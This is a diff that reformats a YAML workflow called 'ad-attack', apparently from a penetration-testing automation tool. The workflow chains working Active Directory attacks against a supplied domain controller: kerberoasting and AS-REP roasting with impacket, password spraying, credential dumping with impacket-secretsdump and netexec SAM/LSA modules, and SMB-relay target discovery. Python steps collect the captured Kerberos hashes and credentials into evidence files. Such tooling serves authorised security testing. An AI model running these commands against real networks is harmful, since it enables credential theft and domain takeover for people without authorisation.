@@ -1,6 +1,5 @@
 name: ad-attack
-description: 'Active Directory attack chain — kerberoasting, AS-REP roasting, targeted password spraying, credential dumping,
-  and SMB relay detection. Requires at least one set of valid AD credentials.
+description: 'Active Directory attack chain — kerberoasting, AS-REP roasting, targeted password spraying, credential dumping, and SMB relay detection. Requires at least one set of valid AD credentials.
 
   '
 tags:
@@ -71,28 +70,71 @@ jobs:
       log-stdout: true
       continue-on-error: true
     - name: collect-users
-      script: "import re\n\nusers = set()\n# From netexec user output\nnxc_users = {{ users(steps[0].outputs.typed_outputs)\
-        \ | tojson }}\nfor u in nxc_users:\n    if u.get('username'):\n        users.add(u['username'])\n\n# From enum4linux\n\
-        e4l_users = {{ users(steps[2].outputs.typed_outputs) | tojson }}\nfor u in e4l_users:\n    if u.get('username'):\n\
-        \        users.add(u['username'])\n\nuser_list = '\\n'.join(sorted(users))\nwith open('/tmp/ad-users.txt', 'w') as\
-        \ f:\n    f.write(user_list)\n\nwith open('{{ env.OFX_OUTPUTS }}', 'a') as f:\n    f.write(f\"users_file=/tmp/ad-users.txt\\n\")\n    f.write(f\"user_count={len(users)}\\n\")\n\nprint(f\"Enumerated {len(users)} AD users\")\n"
+      script: |
+        import re
+
+        users = set()
+        # From netexec user output
+        nxc_users = {{ users(steps[0].outputs.typed_outputs) | tojson }}
+        for u in nxc_users:
+            if u.get('username'):
+                users.add(u['username'])
+
+        # From enum4linux
+        e4l_users = {{ users(steps[2].outputs.typed_outputs) | tojson }}
+        for u in e4l_users:
+            if u.get('username'):
+                users.add(u['username'])
+
+        user_list = '\n'.join(sorted(users))
+        with open('/tmp/ad-users.txt', 'w') as f:
+            f.write(user_list)
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"users_file=/tmp/ad-users.txt\n")
+            f.write(f"user_count={len(users)}\n")
+
+        print(f"Enumerated {len(users)} AD users")
   kerberoast:
     name: Kerberoasting
     needs:
     - enum
     steps:
     - name: kerberoast-attack
-      run: "impacket-GetUserSPNs {{ inputs.domain }}/{{ inputs.username }}:'{{ inputs.password }}' \\\n  -dc-ip {{ inputs.target\
-        \ }} -request \\\n  -outputfile /tmp/kerberoast-hashes.txt 2>/dev/null | tee /tmp/kerberoast-output.txt\n"
+      run: |
+        impacket-GetUserSPNs {{ inputs.domain }}/{{ inputs.username }}:'{{ inputs.password }}' \
+          -dc-ip {{ inputs.target }} -request \
+          -outputfile /tmp/kerberoast-hashes.txt 2>/dev/null | tee /tmp/kerberoast-output.txt
       continue-on-error: true
     - name: collect-spns
-      script: "import re\n\nspn_users = []\nhashes = 0\n\ntry:\n    with open('/tmp/kerberoast-output.txt') as f:\n      \
-        \  for line in f:\n            match = re.search(r'(\\S+)\\s+(\\S+/\\S+)', line)\n            if match and 'ServicePrincipalName'\
-        \ not in line:\n                spn_users.append(match.group(0).strip())\nexcept FileNotFoundError:\n    pass\n\n\
-        try:\n    with open('/tmp/kerberoast-hashes.txt') as f:\n        hashes = sum(1 for line in f if line.strip().startswith('$krb5tgs$'))\n\
-        except FileNotFoundError:\n    pass\n\nwith open('{{ env.OFX_OUTPUTS }}', 'a') as f:\n    f.write(f\"spn_count={len(spn_users)}\\\
-        n\")\n    f.write(f\"tgs_hashes={hashes}\\n\")\n\nprint(f\"Kerberoastable accounts: {len(spn_users)}, TGS hashes:\
-        \ {hashes}\")\nfor spn in spn_users:\n    print(f\"  [*] {spn}\")\n"
+      script: |
+        import re
+
+        spn_users = []
+        hashes = 0
+
+        try:
+            with open('/tmp/kerberoast-output.txt') as f:
+                for line in f:
+                    match = re.search(r'(\S+)\s+(\S+/\S+)', line)
+                    if match and 'ServicePrincipalName' not in line:
+                        spn_users.append(match.group(0).strip())
+        except FileNotFoundError:
+            pass
+
+        try:
+            with open('/tmp/kerberoast-hashes.txt') as f:
+                hashes = sum(1 for line in f if line.strip().startswith('$krb5tgs$'))
+        except FileNotFoundError:
+            pass
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"spn_count={len(spn_users)}\n")
+            f.write(f"tgs_hashes={hashes}\n")
+
+        print(f"Kerberoastable accounts: {len(spn_users)}, TGS hashes: {hashes}")
+        for spn in spn_users:
+            print(f"  [*] {spn}")
       log-stdout: true
   asrep-roast:
     name: AS-REP Roasting
@@ -100,16 +142,36 @@ jobs:
     - enum
     steps:
     - name: asrep-attack
-      run: "impacket-GetNPUsers {{ inputs.domain }}/ -dc-ip {{ inputs.target }} \\\n  -usersfile /tmp/ad-users.txt -format\
-        \ hashcat \\\n  -outputfile /tmp/asrep-hashes.txt 2>/dev/null | tee /tmp/asrep-output.txt\n"
+      run: |
+        impacket-GetNPUsers {{ inputs.domain }}/ -dc-ip {{ inputs.target }} \
+          -usersfile /tmp/ad-users.txt -format hashcat \
+          -outputfile /tmp/asrep-hashes.txt 2>/dev/null | tee /tmp/asrep-output.txt
       continue-on-error: true
     - name: collect-asrep
-      script: "import re\n\nasrep_users = set()\nhashes = 0\n\ntry:\n    with open('/tmp/asrep-hashes.txt') as f:\n      \
-        \  for line in f:\n            if line.strip().startswith('$krb5asrep$'):\n                hashes += 1\n         \
-        \       match = re.search(r'\\$krb5asrep\\$23?\\$(.+?)@', line)\n                if match:\n                    asrep_users.add(match.group(1))\n\
-        except FileNotFoundError:\n    pass\n\nwith open('{{ env.OFX_OUTPUTS }}', 'a') as f:\n    f.write(f\"asrep_count={len(asrep_users)}\\\
-        n\")\n    f.write(f\"asrep_hashes={hashes}\\n\")\n\nprint(f\"AS-REP roastable: {len(asrep_users)}, hashes: {hashes}\"\
-        )\nfor u in sorted(asrep_users):\n    print(f\"  [*] {u}\")\n"
+      script: |
+        import re
+
+        asrep_users = set()
+        hashes = 0
+
+        try:
+            with open('/tmp/asrep-hashes.txt') as f:
+                for line in f:
+                    if line.strip().startswith('$krb5asrep$'):
+                        hashes += 1
+                        match = re.search(r'\$krb5asrep\$23?\$(.+?)@', line)
+                        if match:
+                            asrep_users.add(match.group(1))
+        except FileNotFoundError:
+            pass
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"asrep_count={len(asrep_users)}\n")
+            f.write(f"asrep_hashes={hashes}\n")
+
+        print(f"AS-REP roastable: {len(asrep_users)}, hashes: {hashes}")
+        for u in sorted(asrep_users):
+            print(f"  [*] {u}")
       log-stdout: true
   targeted-spray:
     name: Targeted Password Spray
@@ -148,10 +210,22 @@ jobs:
       log-stdout: true
       continue-on-error: true
     - name: collect-spray
-      script: "kerb_hits = {{ users(steps[0].outputs.typed_outputs) | tojson }}\nsmb_hits = {{ users(steps[1].outputs.typed_outputs)\
-        \ | tojson }}\nldap_hits = {{ users(steps[2].outputs.typed_outputs) | tojson }}\n\nall_valid = set()\nfor u in kerb_hits\
-        \ + smb_hits + ldap_hits:\n    if u.get('username'):\n        all_valid.add(u['username'])\n\nwith open('{{ env.OFX_OUTPUTS\
-        \ }}', 'a') as f:\n    f.write(f\"spray_hits={len(all_valid)}\\n\")\n    open('/tmp/ofx_adattack_valid.txt', 'w').write('\\n'.join(sorted(all_valid)))\n    f.write(f\"valid_users_file=/tmp/ofx_adattack_valid.txt\\n\")\n\nprint(f\"Spray hits: {len(all_valid)} valid credentials\")\n"
+      script: |
+        kerb_hits = {{ users(steps[0].outputs.typed_outputs) | tojson }}
+        smb_hits = {{ users(steps[1].outputs.typed_outputs) | tojson }}
+        ldap_hits = {{ users(steps[2].outputs.typed_outputs) | tojson }}
+
+        all_valid = set()
+        for u in kerb_hits + smb_hits + ldap_hits:
+            if u.get('username'):
+                all_valid.add(u['username'])
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"spray_hits={len(all_valid)}\n")
+            open('/tmp/ofx_adattack_valid.txt', 'w').write('\n'.join(sorted(all_valid)))
+            f.write(f"valid_users_file=/tmp/ofx_adattack_valid.txt\n")
+
+        print(f"Spray hits: {len(all_valid)} valid credentials")
       log-stdout: true
   credential-dump:
     name: Credential Dumping
@@ -159,8 +233,9 @@ jobs:
     - enum
     steps:
     - name: secretsdump
-      run: "impacket-secretsdump {{ inputs.domain }}/{{ inputs.username }}:'{{ inputs.password }}'@{{ inputs.target }} \\\n\
-        \  -outputfile /tmp/secretsdump 2>/dev/null | tee /tmp/secretsdump-output.txt\n"
+      run: |
+        impacket-secretsdump {{ inputs.domain }}/{{ inputs.username }}:'{{ inputs.password }}'@{{ inputs.target }} \
+          -outputfile /tmp/secretsdump 2>/dev/null | tee /tmp/secretsdump-output.txt
       continue-on-error: true
     - task: netexec
       name: nxc-sam
@@ -185,12 +260,28 @@ jobs:
       log-stdout: true
       continue-on-error: true
     - name: collect-creds
-      script: "import re\n\nhashes = set()\ntry:\n    with open('/tmp/secretsdump-output.txt') as f:\n        for line in\
-        \ f:\n            if ':::' in line and 'Dumping' not in line:\n                hashes.add(line.strip())\nexcept FileNotFoundError:\n\
-        \    pass\n\nsam_creds = {{ users(steps[1].outputs.typed_outputs) | tojson }}\nlsa_creds = {{ users(steps[2].outputs.typed_outputs)\
-        \ | tojson }}\n\nwith open('{{ env.OFX_OUTPUTS }}', 'a') as f:\n    f.write(f\"hash_count={len(hashes)}\\n\")\n  \
-        \  f.write(f\"sam_count={len(sam_creds)}\\n\")\n    f.write(f\"lsa_count={len(lsa_creds)}\\n\")\n\nprint(f\"Secretsdump:\
-        \ {len(hashes)} hashes\")\nprint(f\"SAM: {len(sam_creds)}, LSA: {len(lsa_creds)}\")\n"
+      script: |
+        import re
+
+        hashes = set()
+        try:
+            with open('/tmp/secretsdump-output.txt') as f:
+                for line in f:
+                    if ':::' in line and 'Dumping' not in line:
+                        hashes.add(line.strip())
+        except FileNotFoundError:
+            pass
+
+        sam_creds = {{ users(steps[1].outputs.typed_outputs) | tojson }}
+        lsa_creds = {{ users(steps[2].outputs.typed_outputs) | tojson }}
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"hash_count={len(hashes)}\n")
+            f.write(f"sam_count={len(sam_creds)}\n")
+            f.write(f"lsa_count={len(lsa_creds)}\n")
+
+        print(f"Secretsdump: {len(hashes)} hashes")
+        print(f"SAM: {len(sam_creds)}, LSA: {len(lsa_creds)}")
       log-stdout: true
   relay-detect:
     name: SMB Relay Detection
@@ -198,22 +289,41 @@ jobs:
     - enum
     steps:
     - name: smb-signing
-      run: 'netexec smb {{ inputs.target }} --gen-relay-list /tmp/relay-targets.txt 2>/dev/null | tee /tmp/smb-signing.txt
-
-        '
+      run: |
+        netexec smb {{ inputs.target }} --gen-relay-list /tmp/relay-targets.txt 2>/dev/null | tee /tmp/smb-signing.txt
       continue-on-error: true
     - name: webdav-check
-      run: "netexec smb {{ inputs.target }} -u {{ inputs.username }} -p '{{ inputs.password }}' \\\n  -d {{ inputs.domain\
-        \ }} -M webdav 2>/dev/null | tee /tmp/webdav-output.txt\n"
+      run: |
+        netexec smb {{ inputs.target }} -u {{ inputs.username }} -p '{{ inputs.password }}' \
+          -d {{ inputs.domain }} -M webdav 2>/dev/null | tee /tmp/webdav-output.txt
       continue-on-error: true
     - name: collect-relay
-      script: "relay_targets = []\ntry:\n    with open('/tmp/relay-targets.txt') as f:\n        for line in f:\n         \
-        \   ip = line.strip()\n            if ip:\n                relay_targets.append(ip)\nexcept FileNotFoundError:\n \
-        \   pass\n\nwebdav = False\ntry:\n    with open('/tmp/webdav-output.txt') as f:\n        content = f.read()\n    \
-        \    if 'WebClient' in content and 'Enabled' in content:\n            webdav = True\nexcept FileNotFoundError:\n \
-        \   pass\n\nwith open('{{ env.OFX_OUTPUTS }}', 'a') as f:\n    f.write(f\"relay_count={len(relay_targets)}\\n\")\n\
-        \    f.write(f\"webdav_enabled={'yes' if webdav else 'no'}\\n\")\n\nprint(f\"SMB signing disabled (relay targets):\
-        \ {len(relay_targets)}\")\nprint(f\"WebDAV enabled: {webdav}\")\n"
+      script: |
+        relay_targets = []
+        try:
+            with open('/tmp/relay-targets.txt') as f:
+                for line in f:
+                    ip = line.strip()
+                    if ip:
+                        relay_targets.append(ip)
+        except FileNotFoundError:
+            pass
+
+        webdav = False
+        try:
+            with open('/tmp/webdav-output.txt') as f:
+                content = f.read()
+                if 'WebClient' in content and 'Enabled' in content:
+                    webdav = True
+        except FileNotFoundError:
+            pass
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"relay_count={len(relay_targets)}\n")
+            f.write(f"webdav_enabled={'yes' if webdav else 'no'}\n")
+
+        print(f"SMB signing disabled (relay targets): {len(relay_targets)}")
+        print(f"WebDAV enabled: {webdav}")
       log-stdout: true
   summary:
     name: AD Attack Summary
@@ -225,67 +335,77 @@ jobs:
     - relay-detect
     steps:
     - name: report
-      run: 'echo "======================================================"
-
-        echo " AD ATTACK CHAIN COMPLETE: {{ inputs.target }}"
-
-        echo " Domain: {{ inputs.domain }}"
-
+      run: |
         echo "======================================================"
-
+        echo " AD ATTACK CHAIN COMPLETE: {{ inputs.target }}"
+        echo " Domain: {{ inputs.domain }}"
+        echo "======================================================"
         echo ""
-
         echo "--- Enumeration ---"
-
         echo "AD users discovered: {{ jobs.enum.outputs.user_count }}"
-
         echo ""
-
         echo "--- Kerberos Attacks ---"
-
         echo "Kerberoastable SPNs: {{ jobs.kerberoast.outputs.spn_count }}"
-
         echo "TGS hashes captured: {{ jobs.kerberoast.outputs.tgs_hashes }}"
-
-        echo "AS-REP roastable: {{ jobs[''asrep-roast''].outputs.asrep_count }}"
-
-        echo "AS-REP hashes: {{ jobs[''asrep-roast''].outputs.asrep_hashes }}"
-
+        echo "AS-REP roastable: {{ jobs['asrep-roast'].outputs.asrep_count }}"
+        echo "AS-REP hashes: {{ jobs['asrep-roast'].outputs.asrep_hashes }}"
         echo ""
-
         echo "--- Password Spray ---"
-
-        echo "Valid credentials: {{ jobs[''targeted-spray''].outputs.spray_hits }}"
-
+        echo "Valid credentials: {{ jobs['targeted-spray'].outputs.spray_hits }}"
         echo ""
-
         echo "--- Credential Dumping ---"
-
-        echo "Secretsdump hashes: {{ jobs[''credential-dump''].outputs.hash_count }}"
-
-        echo "SAM entries: {{ jobs[''credential-dump''].outputs.sam_count }}"
-
-        echo "LSA secrets: {{ jobs[''credential-dump''].outputs.lsa_count }}"
-
+        echo "Secretsdump hashes: {{ jobs['credential-dump'].outputs.hash_count }}"
+        echo "SAM entries: {{ jobs['credential-dump'].outputs.sam_count }}"
+        echo "LSA secrets: {{ jobs['credential-dump'].outputs.lsa_count }}"
         echo ""
-
         echo "--- Relay Opportunities ---"
-
-        echo "No-signing hosts: {{ jobs[''relay-detect''].outputs.relay_count }}"
-
-        echo "WebDAV enabled: {{ jobs[''relay-detect''].outputs.webdav_enabled }}"
-
-        '
+        echo "No-signing hosts: {{ jobs['relay-detect'].outputs.relay_count }}"
+        echo "WebDAV enabled: {{ jobs['relay-detect'].outputs.webdav_enabled }}"
       log-stdout: true
     - name: export-to-project
-      script: "import json, os\nfrom pathlib import Path\n\nproject = '{{ vars.project_path | default(\"\", true) }}'\nif\
-        \ not project:\n    print('No --project set, skipping file export')\nelse:\n    p = Path(project)\n\n    # AD users\n\
-        \    d = p / 'scans'\n    d.mkdir(parents=True, exist_ok=True)\n    sf = '''{{ jobs.enum.outputs.users_file | default('', true) }}'''\n    if sf:\n        import shutil\n        shutil.copy2(sf, d / 'ad-users.txt')\n        print(f'  [+] scans/ad-users.txt')\n\n    # spray hits\n    d = p / 'evidence/creds'\n    d.mkdir(parents=True,\
-        \ exist_ok=True)\n    sf = '''{{ jobs['targeted-spray'].outputs.valid_users_file | default('', true) }}'''\n    if sf:\n        import shutil\n        shutil.copy2(sf, d / 'spray-valid.txt')\n        print(f'  [+] evidence/creds/spray-valid.txt')\n\n    # kerberoastable SPNs\n    d = p / 'evidence/creds'\n    d.mkdir(parents=True,\
-        \ exist_ok=True)\n    data = '''{{ jobs.kerberoast.outputs.spn_count | default('', true) }}'''.strip()\n    if data:\n\
-        \        (d / 'kerberoast-spns.txt').write_text(data)\n        print(f'  [+] evidence/creds/kerberoast-spns.txt ({len(data.splitlines())}\
-        \ lines)')\n\n    # AS-REP roastable\n    d = p / 'evidence/data'\n    d.mkdir(parents=True, exist_ok=True)\n    data\
-        \ = '''{{ jobs['asrep-roast'].outputs.asrep_count | default('', true) }}'''.strip()\n    if data:\n        (d / 'asrep-users.txt').write_text(data)\n\
-        \        print(f'  [+] evidence/data/asrep-users.txt ({len(data.splitlines())} lines)')\n\n    print(f'Project export\
-        \ complete: {project}')"
+      script: |
+        import json, os
+        from pathlib import Path
+
+        project = '{{ vars.project_path | default("", true) }}'
+        if not project:
+            print('No --project set, skipping file export')
+        else:
+            p = Path(project)
+
+            # AD users
+            d = p / 'scans'
+            d.mkdir(parents=True, exist_ok=True)
+            sf = '''{{ jobs.enum.outputs.users_file | default('', true) }}'''
+            if sf:
+                import shutil
+                shutil.copy2(sf, d / 'ad-users.txt')
+                print(f'  [+] scans/ad-users.txt')
+
+            # spray hits
+            d = p / 'evidence/creds'
+            d.mkdir(parents=True, exist_ok=True)
+            sf = '''{{ jobs['targeted-spray'].outputs.valid_users_file | default('', true) }}'''
+            if sf:
+                import shutil
+                shutil.copy2(sf, d / 'spray-valid.txt')
+                print(f'  [+] evidence/creds/spray-valid.txt')
+
+            # kerberoastable SPNs
+            d = p / 'evidence/creds'
+            d.mkdir(parents=True, exist_ok=True)
+            data = '''{{ jobs.kerberoast.outputs.spn_count | default('', true) }}'''.strip()
+            if data:
+                (d / 'kerberoast-spns.txt').write_text(data)
+                print(f'  [+] evidence/creds/kerberoast-spns.txt ({len(data.splitlines())} lines)')
+
+            # AS-REP roastable
+            d = p / 'evidence/data'
+            d.mkdir(parents=True, exist_ok=True)
+            data = '''{{ jobs['asrep-roast'].outputs.asrep_count | default('', true) }}'''.strip()
+            if data:
+                (d / 'asrep-users.txt').write_text(data)
+                print(f'  [+] evidence/data/asrep-users.txt ({len(data.splitlines())} lines)')
+
+            print(f'Project export complete: {project}')
       continue-on-error: true
